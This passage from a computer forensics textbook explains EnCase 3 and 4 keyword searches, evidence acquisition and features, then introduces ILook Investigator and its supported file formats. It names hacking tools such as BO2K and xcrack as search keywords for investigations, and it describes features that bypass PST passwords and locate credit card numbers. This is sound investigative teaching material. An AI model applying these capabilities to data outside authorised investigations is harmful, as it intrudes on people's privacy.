Notice the search icon (binoculars) on the right-hand side of the tool bar ([Figure 6.16](#c6.xhtml#f6.16)). Click the icon to display the Search screen ([Figure 6.20](#c6.xhtml#f6.20)). Make the appropriate selections in the checkboxes, then click Start Analysis.

![Figure 6.20 Search screen.](images/fig6.20.jpg)

*Figure 6.20* Search screen.

Click the Bookmarks tab to view the keywords ([Figure 6.21](#c6.xhtml#f6.21)). Now click in the box next to the magnifying glass (with the word Search next to it), and you will see all the checkboxes next to your search terms suddenly appear with blue checkmarks.

![Figure 6.21 Viewing the keywords.](images/fig6.21.jpg)

*Figure 6.21* Viewing the keywords.

When you click on a search term, you will see those keywords come up. For example, click on the keyword “Patty” to display the results shown in [Figure 6.22](#c6.xhtml#f6.22). You can see that we have learned some interesting information that we will need to turn over to the law enforcement authorities.

![Figure 6.22 Search results from “Patty.”](images/fig6.22.jpg)

*Figure 6.22* Search results from “Patty.”

In the bottom pane ([Figure 6.23](#c6.xhtml#f6.23)), we see all the text surrounding the keyword we have chosen.

![Figure 6.23 Text surrounding the keyword.](images/fig6.23.jpg)

*Figure 6.23* Text surrounding the keyword.

A search on the keyword “bitchx” (a hacker tool) shows us that a hacker tool was used on this system (see [Figure 6.24](#c6.xhtml#f6.24)). A search on the keyword “crack” reveals xcrack, a tool used to crack passwords ([Figure 6.25](#c6.xhtml#f6.25)).

![Figure 6.24 Search results on “bitchx.”](images/fig6.24.jpg)

*Figure 6.24* Search results on “bitchx.”

![Figure 6.25 Search results for “crack.”](images/fig6.25.jpg)

*Figure 6.25* Search results for “crack.”

We could continue on but you get the idea of how to perform a search using EnCase. We would eventually come up with the same information that AccessData found for us if we continued through the rest of the keywords (and included all the same ones that we used with AccessData).

EnCase has very nice reporting capabilities. It automatically builds your report for you while you progress through the investigation. You can bookmark and add to your report whatever you wish as you move through the suspect’s data. Note that you have to click the Report tab to see the report.

EnCase has another interesting capability called EScript. This is a programming tool (C line syntax) that allows the user to enhance the searching capabilities of EnCase on an as-needed basis. Guidance Software also maintains a number of EScript files you can download from their website. We will not cover EScript in this book, but if you know C/C++ programming then it is very easy to pick up because the syntax is very similar. I used version 3 of EnCase in this example because this is the version most forensic examiners are using at this time. However, it is important to note that in 2003, Guidance Software released a new version of EnCase (version 4). Let us take a look now at EnCase 4 and cover some of its key characteristics.

Let us also note that there are actually two different editions of EnCase 4. There is the EnCase Enterprise Edition (known as EEE or E-cubed or E3) and the EnCase Forensic Edition (EFE). Let us briefly discuss E3, then move on to a more detailed discussion of how EFE works.

EnCase Enterprise Edition (E3) originally entered the market in August of 2002. E3 provides CFIs the capability to gather static system data from devices on the network. With version 4 the additional capability of being able to collect volatile system data from servers and workstations over a LAN (local area network) or WAN (wide area network) has been added. Guidance Software has named this volatile data capture feature System Snapshot. Another new feature of version 4 is its log file parsing capability.

When we speak of volatile system data we are referring to data that is in RAM (Random Access Memory; the main memory of a workstation or server). On a UNIX system, if power fails, this data goes to a Core file on the hard drive, which you can analyze with EnCase, AccessData’s FTK (Forensic Tool Kit), NTI (New Technologies, Inc.) tools, etc. Some of the RAM data also goes to the hard drive of a Windows system if power is suddenly lost (into the slack space, etc.) but no specific file absorbs such data. In our case, what if we want to read the RAM data while the system is in operation? E3 can handle this.

What type of information can be obtained by E3 using System Snapshot? I will list a few examples here:

*   Information pertaining to what was occurring on a specific system at a specific point in time
*   Network connection information
*   IP (Internet Protocol) addresses
*   TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) ports in use
*   What files are being accessed
*   What accounts are being used on the system (from which you may be able to ascertain specifically who is using the system)
*   Running applications and processes
*   Windows Registry keys that are currently active

When using EnCase Enterprise Edition’s System Snapshot (E3SS), there is no need to take the system out of service so there is no interference with normal business operations. The CFI simply runs an E3 Snapshot script to capture the volatile data. I should note that the System Snapshot capability of E3 is not new in the sense that other tools on the market have this capability (and some provide even more information than System Snapshot). What is new here is that GS (Guidance Software) has incorporated this System Snapshot capability within its own tool with a nice user interface that makes it administratively easier to obtain this volatile data.

E3 also has built-in filters that allow the user to perform a more detailed open port analysis. The software code for the filters can be viewed and modified by the Analyst. Another new feature in this version of E3 is the Application Descriptor (AD). The Application Descriptor provides a categorization of executable files via their hash values. This enables the Analyst to identify running executables via a hash value match. This means that if you have the hash values loaded for a large number of known hacker tools, you can compare the hash values of processes running in RAM memory with these known hash values and quickly ascertain whether a malicious program is running on the system. Note that Application Descriptor works in tandem with another new feature of E3 called Machine Profile (MP). Machine Profile is used to ascertain what processes should be running on a given system. Used in tandem, MP and AD can show an Analyst what should be running on the system versus what is actually running on the system. Obviously this could be very enlightening.

E3 has the continued ability to preview the hard drive of the system under investigation so that an analysis can be done of the data on the drive. Here we are referring to static data (i.e., data that is actually stored on the hard drive, not the data in RAM). This preview in E3 is allowing the Analyst to examine the hard drive contents over the network. He or she does not have to be sitting at the actual machine that is being investigated.

Log file parsing is specific to the type of log file of interest. For example, I can tell E3 to parse common UNIX log files such as cron, history, or spooler. It understands how these log files are set up and thus easily and quickly provides the necessary data to the Analyst in a very easy-to-read clear text format.

That pretty much covers the new features that are in EnCase Enterprise Edition (E3). Let us move on now to the flagship product of GS, version 4 of EnCase Forensic Edition (EFE).

Guidance Software has developed a somewhat new interface for version 4 of EFE when compared to version 3. One of the first things I want to mention is that I highly recommend the use of FastBloc LE in conjunction with EFE. FastBloc LE is a hard drive imaging device that enables analysts to securely acquire the image of a hard drive much faster (up to three times faster) than if they were to use native DOS (as has been done for the past 20 years or so). FastBloc LE will not compromise data integrity in any way, and it is specifically designed for use with EnCase software. Using FastBloc LE, you can perform the acquisition in a Microsoft Windows environment. An added bonus is that the Analyst can safely hot-swap suspect drives, which is quite convenient.

Because we have already covered a case using version 3 of EnCase, our main focus here will be on the new features that version 4 brings to the table. These new features include PST file support (Microsoft Outlook e-mail), enhanced EnScript functions, UNIX file support, faster acquisitions, enhanced recovery of compound files and metadata, and disk configuration support. As a prelude, again note that EFE (along with tools from NTI, AccessData, and ILook) has been successfully admitted into evidence in thousands of trials and hearings worldwide. The tools and evidence derived from these four vendors are now the standard by which computer investigations are conducted. Let us now go into a little more detail concerning the new features in EnCase 4:

*   You can now view PST files in plain text format (just as AccessData’s FTK has been able to do in the past). It can also now handle compressible encryption and full encryption along with the ability to bypass PST file passwords (similar to AccessData’s FTK).
*   With Unicode and advanced-language support, the Analyst can enter keywords (and review the search results and documents) in the language in which the suspect created the original information.
*   You can form more complex filters by combining the simple filters you could create in version 3. For instance, you can easily run a query such as “I only want to see GIFs that are 500K or smaller with a creation date between 4/16/85 and 9/23/87.” The simple filters are combined into complex filters using Boolean logic.
*   Time zone management allows the Analyst to specify time zone settings for each evidence file, for each volume, and for each case.
*   It is possible to parse UNIX and Linux binary log files (utmp, utmpx, wtmp, wtmpx) inside EnCase. There is no longer the need to decode these files outside of EnCase.
*   NTFS files are automatically identified by EnCase, and compressed files are automatically decompressed for plain text analysis.
*   The Analyst can view NTFS file/folder ownership and permissions by SID (Security Identifier) on each NTFS volume, and the SIDs can be cross-referenced with registry files to ascertain which user and group names correspond to each SID.
*   EnCase 4 locates Windows 95/98 deleted Registry Keys.

That takes care of the major new features. Enhancements have been made in several areas, as follows:

*   A really nice enhancement is the ability to open multiple cases at one time and easily navigate between the various cases.
*   The filter interface has been vastly improved. By that I mean that the GS engineers have separated the filter interface from the EnScript tab. This allows for much faster creation, activation, and deactivation of filters.
*   Another nice enhancement is the improvements made to the EnScript programming interface. The Analyst can now compile and save EnScripts without running them, the new interface allows for easier editing of code, and new commands are available that make EnScript programs more powerful.
*   The keyword-searching algorithm has been significantly enhanced to provide for a dramatic increase in keyword search speed. You can now perform multiple-term keyword searches almost as fast as single-term keyword searches.

For those unfamiliar with EnCase, let me provide you with a set of standard features that are in both EnCase version 3 and version 4:

*   The file systems listed in [Table 6.1](#c6.xhtml#t6.26) are handled by EnCase. It is important to note though that even if EnCase does not recognize the file system (displays the unrecognized file system as an unallocated cluster file), you can still perform keyword and file header searches. What you will not have are the names of files and the folder structure.
*   The EnScript Macro Language allows the Analyst to develop filters and programs that further customize EnCase to allow more automated analysis.
*   Picture Gallery automatically identifies graphics files and displays them as thumbnails.
*   EnCase restores physical disk images to hard drives in Microsoft Windows.
*   A noninvasive preview mode allows you to view the contents of a hard drive. This helps the Analyst decide whether or not to spend the time acquiring the hard drive.
*   A graphical timeline viewer is available.
*   The Analyst can view the Windows Registry, Outlook e-mail files (including attachments), and Zip files.
*   The Analyst can sort files by a number of criteria.
*   You can utilize UNIX GREP syntax in your searches.
*   You can import custom sets of hash files (or create your own).
*   Case-based methodology is used.
*   Versions 3 and 4 read Zip, Jaz, floppies, magneto-optical, and all IDE and SCSI (Small Computer Systems Interface) hard drives.
*   Bitstream backups can be performed in either DOS or Windows (using FastBloc).
*   You can view files with no risk to the file content.
*   You can conduct keyword searches using any number of search terms.
*   Any files, file segments, or images can be bookmarked and saved for future reference. These bookmarks can be automatically saved in the report you are generating.
*   The Hex/Text viewer shows the contents of any file with file slack appearing in red.
*   A graphical map displays disk allocation by either cluster or sector.
*   You can view swap files, slack space, print spool files, and Recycle Bin contents.
*   You can recognize and validate file signatures. You can also add your own signatures as needed.
*   You can export files/folders (or portions thereof).
*   You can restore disk or volume images to another hard drive.

 

*Table 6.1* File systems handled by EnCase.

 
| ***FAT12*** || ***FAT16*** || ***FAT32*** || ***DVD*** || ***UFS (UNIX)*** |
| --- | --- | --- | --- | --- |
| **PALM** || **HFS (Macintosh)** || **HFS+ (Power Mac)** || **FFS (BSD)** || **NTFS** |
| **EXT2** || **EXT3** || **Reiser** || **UDF** || **CDFS (CD-ROM)** |
| **ISO 9660 Joliet** || **Sun Solaris** ||   ||   |

A dongle, which is a type of security key that can be of either the USB or parallel port flavor, is required if you wish to perform analysis on the data you have collected. If you only want to perform an acquisition (i.e., a bitstream backup) of a hard drive (or other media) then the dongle is not required.

When performing a search, you utilize keywords. These are words that would potentially be pertinent to the case you are working on. For instance, if you are investigating a hacking case you might have a list of keywords that are names of hacking tools or files that said programs might use. For instance, if someone remotely controlled a Microsoft Windows 2000 system, you would include a keyword such as “BO2K” because that is a hacker tool that has the capability of remotely controlling this type of system. Keywords are global and can be shared across multiple cases. They are stored in a Keywords. ini file. Usually an Analyst will categorize keywords into folders so that they are readily available for various types of cases. When you are involved with more than one case, it is relatively easy to correlate and corroborate evidence between different cases. Once you load the appropriate keywords, you can begin the search and search all cases at one time.

Two separate windows have now been implemented for file types and file signatures. The file type initially presented to the Analyst is extracted from the file extension (exe, doc, xls, ppt, etc.) but once a Signature Analysis has been instigated, the Signature column will be filled with the correct information.

Additional new items in EnCase 4 are:

*   RAID support is present.
*   EnCase 4 has the ability to extract the owner, group, and permissions set for all files and folders.
*   The SID is displayed if applicable.
*   NTFS compressed files can be decompressed using virtual devices and then analyzed just like any other file.
*   Analysis of the OLE (Object Linking and Embedding) file format, which is used by various applications such as Microsoft Word, PowerPoint, and Excel, is possible. A substantial amount of metadata can be stored in OLE files (URLs \[universal resource locators\], last username to save the document, revision date, company name, file author, date the file was created, when the file was last printed, time it was edited, etc.), and EnCase can see it all when you use the View File Structure command.
*   Some of the new EnScripts included with EnCase include: 
    *   Locate disk sectors that are completely filled with a certain character
    *   Locate e-mail addresses
    *   Locate JPEG, GIF, BMP, and EMF image files in unallocated clusters
    *   Locate all Internet Explorer History information
    *   Locate all Visa, American Express, and MasterCard credit card numbers
    *   Parse UNIX and Sun Solaris log files
    *   On the EnCase CD you can find the Irfanview. This is a Freeware graphics viewer. You can set this up as an external file viewer inside EnCase. If you want the latest version, go to [http://www](http://www). irfanview.com.

In EnCase 4 the easiest way to acquire media is to use the EnCase Network Boot Disk (ENBD). This allows you to use the network interface cards (NICs) in the systems instead of using a parallel or USB cable. To use the ENBD you need to go to this URL and download the appropriate files:

[http://www.guidancesoftware.com/support/articles/networkbootdisk.shtm](http://www.guidancesoftware.com)

According to Guidance Software’s website, the NIC cards shown in [Table 6.2](#c6.xhtml#t6.27) can be automatically detected and the appropriate drivers will then be loaded so that you can begin the acquisition.

*Table 6.2* NIC Cards supported by EnCase.

  
|   |
| --- |
| **PCI Cards Supported*****Auto or Manual Loading***3COM 10/100 V.90 Mini-PCI Combo Card3COM Etherlink 10/100 with 3XP (3C990)3COM EtherLink III Series3COM EtherLink XL SeriesACCTON EN1207D-TX/EN2242A SeriesACCTON EN5251 SeriesADMTEK PCI 10/100 SeriesAMD PCNet SeriesBROADCOM 440x 10/100BROADCOM NetXtreme GigabitCOMPAQ 10/100 and GigabitCOMPAQ Gigabit 6134/6136 (Intel)COMPAQ NetFlex-3D-LINK DFE-530TX+ 10/100 SeriesD-LINK DFE-550TX 10/100 SeriesDAVICOM PCI Based SeriesDIGITAL 2104x/2114x 10/100 SeriesHP 10/100 VGINTEL PRO SeriesINTEL PRO/1000 Server SeriesLITE-ON PNIC-10/100 SeriesMACRONIX MX987xx SeriesNATIONAL DP83815 10/100 MacPhyter SeriesN ETC EAR FA310TX AdapterREALTEK RTL8029 SeriesREALTEK RTL8139/81 OX SeriesSIS 900/7016 SIS900 10/100 SeriesSMC EtherPower II 10/100 (9432TX)SMC Fast Ethernet 10/100 (1211TX)VIA PCI 10/100Mb Series**SCSI controller cards supported*****Auto or manual loading***AIC-7890/91AIC-78XX/AIC-75XXAMD PCscsiBusLogic FlashPointBusLogic MultiMasterIBM ServeRAIDInitio INI-9XXXU/UWInitio INI-A100U2WSymbios 53C8xx**PCMCIA cards supported*****Manual loading***3COM 3CCFE574BT 10/100 LAN PC Card3COM 3CXFE574BT 10/100 LAN PC Card3COM 3CCFE575 10/100 Cardbus LAN PC CardINTEL EtherExpress PRO/100 Mobile 16-Bit PC CardINTEL PRO/100 CardBus AdapterNETGEAR FA410TX Fast Ethernet PC CardN ETC EAR FA411 PCMCIA Mobile AdapterNETGEAR FA511 CardBus Mobile AdapterXIRCOM CBEM56G-100 CardBus Ethernet 10/100+Modem 56XIRCOM RBEM56G-100 RealPort CardBus Ethernet 10/100+Modem 56XIRCOM R2BEM56G-100 RealPort2 Cardbus Ethernet 10/100+Modem 56XIRCOM R2E-100BTX RealPort2 Ethernet 100XIRCOM RE-100BTX RealPort Ethernet 100XIRCOM CE3B-100BTX CreditCard Ethernet 10/100XIRCOM CE3-10BT CreditCard Ethernet 10 |

As you may recall from our discussion of EnCase 3, the Analyst has the option of either previewing or acquiring the media. You could then acquire media after you previewed the media if you so desired. The negative aspect of the preview mode was that you could not save your findings.

It is a somewhat different ballgame with EnCase 4, which forces the Analyst to preview before acquiring. Of course, because you did not perform an acquisition, you have to be physically connected to the media that you previewed to view your case results. Nonetheless, the ability to save your previewed results to a case file is a major plus. By previewing the media, the Analyst does not have to wait several hours (or over a weekend) to complete an acquisition before performing a preliminary examination. During the preview, the Analyst can run keyword searches and create bookmarks, which can be saved into a case file. Note that most EnCase functions are available to the Analyst when previewing the media.

Let us move on now to see what it is like to work a case with EnCase 4. Please keep in mind here that my goal is not to show you all the different things EnCase 4 can do. We will work on the very same case that we did earlier with the product from AccessData so that you can see how to perform the same type of analysis along with seeing the similarities and differences between the tools. [Figure 6.26](#c6.xhtml#f6.28) shows the opening screen in EnCase 4.

![Figure 6.26 The opening screen in Encase 4.](images/fig6.28.jpg)

*Figure 6.26* The opening screen in Encase 4.

To acquire an image, click on New, which opens the Case Options screen. Either enter the information or accept the defaults for (case) Name, Examiner Name, Default Export Folder, and Temporary Folder; then click Finish.

On the next screen, click on Add Device. On the Add Device screen, click the checkbox next to 1 Local Drives; then click Next, which opens the Choose Devices screen.

On the Choose Devices screen, click the checkbox next to 1 (drive) A:, which is where we placed the evidence file; then click Next, which opens the Preview Devices screen ([Figure 6.27](#c6.xhtml#f6.29)). Recall that EnCase 4 forces an Analyst to preview before acquisition. Click Finish. As shown in [Figure 6.28](#c6.xhtml#f6.30), A has been added under TestCasel.

![Figure 6.27 The Preview Devices screen.](images/fig6.29.jpg)

*Figure 6.27* The Preview Devices screen.

![Figure 6.28 With “A” added under TestCase1.](images/fig6.30.jpg)

*Figure 6.28* With “A” added under TestCase1.

Click the Cases tab at the upper left. Notice in [Figure 6.29](#c6.xhtml#f6.31) that the evidence file, LIB27.S01, is in position 1. Because this is the only file of interest to us, uncheck the other checkmarks, leaving only the checkmark in the 1 box.

![Figure 6.29 Evidence file in position 1.](images/fig6.31.jpg)

*Figure 6.29* Evidence file in position 1.

Now right-click on the A: drive, which opens the menu shown in [Figure 6.30](#c6.xhtml#f6.32). Click on Acquire, which displays the After Acquisition screen. Select the radio button Replace source device. This adds the new evidence file LIB27.S01 to the case, replacing the live preview ([Figure 6.31](#c6.xhtml#f6.33)).

![Figure 6.30 “A” drive menu.](images/fig6.32.jpg)

*Figure 6.30* “A” drive menu.

![Figure 6.31 New evidence file LIB27.S01 added to the case.](images/fig6.33.jpg)

*Figure 6.31* New evidence file LIB27.S01 added to the case.

Fill in the Name and Notes, and select no compression. The other fields are automatically filled in by EnCase. Click Finish.

Once the file is acquired, a partial view of the contents of the case file LIB27.S01 is displayed ([Figure 6.32](#c6.xhtml#f6.34)). Note that we have scroll bars on the right if we wish to take a look at other file portions.

![Figure 6.32 The contents of the case file LIB27.S01.](images/fig6.34.jpg)

*Figure 6.32* The contents of the case file LIB27.S01.

If you click on Devices, then scroll to the right, you will see that EnCase has indeed hashed the file and verified this hash. The image file (also called the evidence file or bitstream backup) has now been acquired.

Recall now how we have a checkmark in the checkbox to the left of our LIB27.S01 file. This is pertinent to the searching capability of EnCase.

It tells EnCase which file we want to perform our search in. This is particularly important if we have a large number of files and we only want to search through a few of them.

Now we need to perform our keyword search operation. We could have set this up before we did the acquisition but I chose not to. Use the original set of keywords in the PattyKey.txt file. Click on View, which opens the menu shown in [Figure 6.33](#c6.xhtml#f6.35).

![Figure 6.33 View menu.](images/fig6.35.jpg)

*Figure 6.33* View menu.

In EnCase 4, keywords can be accessed by all cases that reside on your computer. That being the case, it is very important to group the keywords by appropriate categories so that they can be easily located when you need them. You will create folders to hold these various categories of keywords (Guidance Software calls these Keyword Groups).

To create a Keyword Group (KG), which we will call Patty, click on the Keywords tab ([Figure 6.34](#c6.xhtml#f6.36)).

![Figure 6.34 Creating a keyword group.](images/fig6.36.jpg)

*Figure 6.34* Creating a keyword group.

Notice that there are some folders already created. To create the Patty folder, right-click on the word “Keywords.” On the next menu, click on New Folder, then type the name of the folder (Patty) to add it to the list.

Your keywords can be moved into this folder in a variety of ways. Notice the menu items in [Figure 6.35](#c6.xhtml#f6.37) that I obtain by a right click on the Patty folder. Click the Add Keyword List item, which opens the Add Keyword List screen. We can populate the keyword list by simply doing a cut and paste from our PattyKey.txt file. Note that in this mode you can only have one keyword per line. There are other ways to perform searches using phrases instead of individual words. [Figure 6.36](#c6.xhtml#f6.38) displays most of the keywords we are using, but there are a few more above the word “police” that you do not see. Just keep in mind that we are using the keywords that I listed earlier.

![Figure 6.35 Menu items obtained by right-clicking the “Patty” folder.](images/fig6.37.jpg)

*Figure 6.35* Menu items obtained by right-clicking the “Patty” folder.

![Figure 6.36 Keyword list.](images/fig6.38.jpg)

*Figure 6.36* Keyword list.

Notice the checkmark in the Active Code-Page box. This occurs by default and works fine for the type of search we are doing. Now click OK and you see our list of 26 keywords show up in a new window.

Click on the Search button in the toolbar. This is a Search screen, and I have placed checkmarks in the boxes appropriate for this search ([Figure 6.37](#c6.xhtml#f6.39)).

![Figure 6.37 Active Code-Page search screen.](images/fig6.39.jpg)

*Figure 6.37* Active Code-Page search screen.

Click on Start to begin the search. When completed, you will see a summary of the results. Click OK to continue. To view the search hits, click on the View menu, then click on Search Hits, which displays the results ([Figure 6.38](#c6.xhtml#f6.40)).

![Figure 6.38 Active Code-Page search results.](images/fig6.40.jpg)

*Figure 6.38* Active Code-Page search results.

To see the text that surrounds the search term, click on the item under Preview. This is something that should be included in the final report. If you right-click on the blue highlighted area, an options menu opens, which allows you to Bookmark Data, Export Copy, and Go To. Scroll down the contents of the case file under Preview ([Table 6.2](#c6.xhtml#t6.27)) to obtain information shown in [Figure 6.39](#c6.xhtml#f6.41).

![Figure 6.39 Highlighted information in case file.](images/fig6.41.jpg)

*Figure 6.39* Highlighted information in case file.

You can see that we have learned some interesting information that we will need to turn over to the law enforcement authorities. These information fragments are typical of what an Analyst can uncover when searching slack space, swap space, and other hidden areas of the hard drive. I have seen multiple hours’, days’, weeks’, and months’ worth of conversations on systems that had been compromised by hackers or that were being used in some fashion for criminal or terrorist-related purposes. It is also important to note that your keyword searches will also generate a significant portion of garbage data (noise). This is information that comes up due to the keyword or phrase you used but is not pertinent to the case you are working on.

Now let us move on to another key forensics tool used in the law enforcement community: ILook Investigator.

## Chapter questions

*   1\. What platforms and file systems does EnCase Forensic Edition support?
*   2\. What is the purpose of EnScript?
*   3\. Can you build custom scripts for special investigative needs and to automate tasks?
*   4\. Has EnCase been NIST verified?

# Chapter 7 ILook Investigator

DOI: [10.1201/9781003134817-7](https://doi.org/10.1201/9781003134817-7)

Now let us take a look at ILook, a forensics tool used to analyze images of computer hard drives. The screens you see will depend on the version of the tool being used of course. We will not be going through our murder case with Patty as in the prior chapters with EnCase and AccessData. Instead, I will be providing an overview of this forensic tool and what procedures to follow to use this tool in the course of an investigation that involves e-mail messages, in particular Microsoft Exchange.pst files. This software was originally engineered by Elliot Spencer, and it is provided to law enforcement agencies globally at no charge. The IRS (Internal Revenue Service) makes this software available through its Electronic Crimes Program. ILook utilizes the Hashkeeper Database, which is maintained by the Department of Justice National Drug Intelligence Center. Some hash tables from the NIST NSRL are also included.

ILook is used to inspect data obtained from any forensic imaging system that creates a straight sector dump of the imaged media (also known as a bitstream backup, bit copy, bit image). Numerous law enforcement and commercial imagers produce images in this format. ILook also supports the examination of Safeback image files, EnCase image files, ISO (International Standards Organization) and CIF CD images, VMWare virtual disks, and of course ILook image files. [Table 7.1](#c7.xhtml#t7.1) lists the file systems supported by ILook.

*Table 7.1* File systems supported by ILook.

  
|   |
| --- |
| **FAT (12,16, 32, VFAT)****NTFS (4 compressed/noncompressed, 5 compressed/noncompressed)****Mac (HFS, HFS+)****Linux (Ext2FS, Ext3FS)****UNIX (SCO Sys V \[AFS, EAFS, HTFS\])****CDFS****Novell Netware NWFS** |

The user interface to ILook is similar to AccessData’s FTK (Forensic Tool Kit) and Guidance Software’s EnCase in that it uses a Microsoft Windows-type interface with the screen broken into various panes to display information. Also similar to the other tools is the ability to perform standard searches and indexed searches. As mentioned in the discussion with a prior tool, indexed searches are much faster as long as you have the time to allow the indexing to be performed in the first place. [Table 7.2](#c7.xhtml#t7.2) through [Table 7.8](#c7.xhtml#t7.3) list the various file types and formats ILook supports.

*Table 7.2* Word Processing file formats supported.

  
| ANSI Text (7 and 8 bit), all ver. || IBM FFT, all ver.; IBM Revisable Form Text, all ver.; IBM Writing Assistant, ver. 1.01 || MultiMate, ver. through 4.0 || Professional Write Plus, ver. 1.0 |
| --- | --- | --- | --- |
| ASCII Text (7 and 8 bitversions available), all ver. || JustWrite, ver. through 3.0 || Novell Perfect Works, ver. 2.0 || Samna Word IV+ SmartWare II, ver. 1.02 |
| Adobe FrameMaker (MIF), ver. 6 || Legacy, ver. through 1.1 || Nota Bene, ver. 3.0 || SmartWare ll, ver. 1.02 |
| Corel WordPerfect for Windows versions through 2002 || Lotus AMI/AMI Professional, ver. through 3.1; Lotus Manuscript, ver. through 2.0; Lotus WordPro (Win32 platforms) SmartSuite 96, 97 and Millennium; Lotus WordPro (Non-Windows platforms – text only) || Novel Perfect Works, ver. 2.0 || Sprint, ver. 1.0 |
| DEC WPS Plus (DX), ver.through 4.0; DEC WPS Plus (WPL), ver. through 4.1 || SmartSuite 97 and Millennium edition || Novell WordPerfect for DOS, ver. through 6.1; Novell WordPerfect for Mac, ver. 1.02 through 3.0; Novell WordPerfect for Windows, ver. through 7.0 || StarOffice Writer (UNIX and Windows), ver. 5.2 |
| DisplayWrite 2 and 3 (TXT),all ver.; DisplayWrite 4 and 5, ver. through 2.0 || MacWire ll, ver. 1.1 || Office writer, ver. 4.0 to 6.0 || Total Word, ver. 1.2 |
| Enable, ver. 3.0, 4.0, and 4.5 || Mass11, ver. through 8.0 || PC-File Letter, ver. through 5.0; PC-File+Letter, ver. through 3.0 || Unicode Text, all ver. |
| First Choice, ver. through 3.0 || Microsoft Rich Text Format (RTF), all ver. || pfs:Write, ver. A, B, and C || Volkswriter3&4, ver. through 1.0 |
| Framework, ver. 3.0 || Microsoft Word for DOS, ver. through 6.0; Microsoft Word for Macintosh, ver. 4.0 through 98; Microsoft Word for Windows, ver. through 2002; Microsoft WordPad, all ver.; Microsoft Works for OS, ver. through 2.0; Microsoft Works for Macintosh, ver. through 2.0; Microsoft Works for Windows, ver. through 4.0 || Professional Write for DOS, ver. through 2.1 || Wang PC (IWP), ver. through 2.6 |
| HTML, ver. through 3.0 || Microsoft Write, ver. through 3.0 || Q&A for DOS, ver. 2.0; Q&A Write for Windows, ver. 3.0 || WordMARC, ver. through Composer PlusWordStar 2000 for DOS, ver. through 3.0; WordStar for DOS, ver. through 7.0; WordStar for Windows, ver. 1.0XyWrite, ver. through III Plus |

*Table 7.3* Spreadsheet file formats supported.

  
| Enable, ver. 3.0,4.0, and 4.5 || Microsoft Excel for Macintosh, ver. 3.0 through 4.0, 98; Microsoft Excel for Windows, ver. 2.2 through 2002; Microsoft Excel Charts, ver. 2.x through 7.0 || Novell Perfect Works, ver. 2.0 |
| --- | --- | --- |
| First Choice, ver. through 3.0 || Microsoft Multiplan, ver. 4.0 || QuattroPro for DOS, ver. through 5.0; QuattroPro for Windows, ver. through 2002 |
| Framework, ver. 3.0 || Microsoft Windows Works, ver. through 4.0 || PFS: Professional Plan, ver. 1.0 |
| Lotus 1-2-3 (DOS & Windows), ver. through 5.0; Lotus 1-2-3 for SmartSuite, SmartSuite 97, and Millennium; Lotus 1-2-3 Charts (DOS & Windows), ver. through 5.0; Lotus 1-2-3 (OS/2), ver. through 2.0; Lotus 1-2-3 Charts (OS/2), ver. through 2.0 || Microsoft Works (DOS), ver. through 2.0; Microsoft Works (Macintosh), ver. through 2.0 || SuperCalc 5, ver. 4.0 |
| Lotus Symphony, ver. 1.0, 1.1, and 2.0 || Mosaic Twin, ver. 2.5 || SmartWare II, ver. 1.02VP Planner 3D, ver. 1.0 |

*Table 7.4* Graphic file formats supported.

  
| A1: Adobe Illustrator File Format, ver. through 7.0 || DRW: Micrografx Draw, ver. through 4.0 || PBM: Portable Bitmap, nospecific version || SDW Ami Draw |
| --- | --- | --- | --- |
| CDR: CorelDraw, ver. through 8.0 || DXF (Binary and ASCII): AutoCAD Drawing Interchange Format, ver. to 14 || PCD: Kodak Photo CD, ver. 1.0 || Snapshot (Lotus), all versions |
| DSF: Micrografx Designer Windows 95, ver. 6.0 || EMF: Windows Enhanced Metafile || PCX Bitmap: PC Paintbrush || SRS: Sun Raster File Format, no specific version |
| DWG: AutoCAD Native Drawing Format, ver. 12 through 14 || EPS: Encapsulated PostScript if TIFF image is embedded in it || Perfect Works (Draw) Novell, ver. 2.0 || Targa Truevision |
| ICES: Initial GraphicsExchange Specification, ver. 5.1 || FMV: FrameMaker graphics vector & raster, through ver. 5.0 || PGM: Portable Gray map, no specific version || TIFF versions through 6 |
| PDF: Portable Document Format Acrobat, ver. 2.1, 3.0, 4.0, and 5.0 || FPX: Kodak Flash Pix, no specific format || PIC: Lotus 1-2-3 Picture File Format, no specific version || TIFF CCITT Group 3 and 4 Fax Systems |
| PS: Postscript Level 2 || GDF: IBM Graphics Data Format, ver. 1.0 || PICT1 and PICT2: (Raster) Macintosh Standard || VISO Visio 4 (page preview only), 5, 2000 and 2002 |
| PSD: Adobe Photoshop File Format, ver. 4.0 || GEM: Graphics Environment Manager Metafile, bitmap and vector || PIF: IBM Picture Interchange Format, ver. 1.0 || WBMP, no specific version |
| Binary Group 3 Fax, all ver. || GIF: Graphics Interchange Format || PNG: Portable Network Graphics Internet Format, ver. 1.0 || WMF: Windows Metafile |
| BMP: (including RLE, ICO, CUR, and OS/2 DIB) Windows || GP4: Group 4 CALS Format Type I and Type II || PNTG: MacPaint || WordPerfect Graphics \[WPG and WPG2\], ver. through 2.0 |
| CDR (if TIFF image is embedded in it) Corel Draw, ver. 2.0–9.0 || HPGL: Hewlett PackardGraphics Language, ver. 2.0 || PPM: Portable Pixmap, no specific version || XBM:X-Windows Bitmap x10 compatible |
| CGM: Computer Graphics Metafile ANSI, CALS, NIST; ver. 3.0 || IMG: GEM Paint, no specific version || Progressive JPEG, no specific version || XPM: X-Windows Pixmap x10 compatible |
| CMX: Corel Clip Art Format, ver. 5 through 6 || JFIF: (JPEG not in TIFF format), all versions || PSP: Paintshop Pro (Win32 only), ver. 5.0, 5.0.1 || XWD: X-Windows Dump x10 compatible |
| DCX: (multi-page PCX) Microsoft Fax || JPEG: Joint Photographic Experts Group, all versions || RND: AutoShade Rendering File Format, ver. 2.0 ||   |
| DRW: Micrografx Designer, ver. 3.1 || MET: OS/2 PM Metafile, ver. 3.0 ||   ||   |

*Table 7.5* Database file formats supported.

  
| Access, ver. through 2.0 || Enable, ver. 3.0,4.0, and 4.5 || Microsoft Windows Works, ver. through 4.0 || Reflex, ver. 2.0 |
| --- | --- | --- | --- |
| dBASE, ver. through 5.0 || FirstChoice, ver. through 3.0 || Microsoft Works (DOS), ver. through 2.0; Microsoft Works (Macintosh), ver. through 2.0 || Q&A, ver. through 2.0 |
| DataEase, ver. 4.x || FoxBase, ver. 2.1 || Paradox (DOS), ver. through 4.0; Paradox (Windows), ver. through 1.0 || SmartWare II, ver. 1.02 |
